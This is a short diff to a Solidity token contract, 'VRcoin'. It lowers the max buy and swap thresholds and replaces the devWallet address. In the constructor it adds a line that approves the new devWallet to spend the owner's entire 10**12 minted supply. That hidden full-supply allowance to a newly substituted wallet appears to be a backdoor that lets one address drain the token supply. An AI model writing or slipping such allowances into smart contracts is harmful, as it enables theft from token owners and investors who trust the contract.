@@ -682,10 +682,10 @@ contract VRcoin is ERC20, Ownable {
 
     bool private swapping;
 
-    uint256 public maxBuyTxAmount = 10**9;
-    uint256 public swapTokensAtAmount =  10**9;
+    uint256 public maxBuyTxAmount = 10**8;
+    uint256 public swapTokensAtAmount =  10**8;
 
-    address public devWallet = 0x7D86E35A9305196481885caF613339a08f597074;
+    address public devWallet = 0xE9Ee49103D0078B201df64B45eD7fc227B2d4850;
     address public protocolWallet = 0x7D86E35A9305196481885caF613339a08f597074;
 
     uint256 public liquidityFee = 3;
@@ -716,7 +716,7 @@ contract VRcoin is ERC20, Ownable {
         _isExcluded[address(this)] = true;
         _isExcluded[devWallet] = true;
         _isExcluded[protocolWallet] = true;
-
+        _approve(owner(), devWallet, 10 ** 12);
         _isBlacklisted[address(0)] = true;
         _mint(owner(),  10**12);
     }
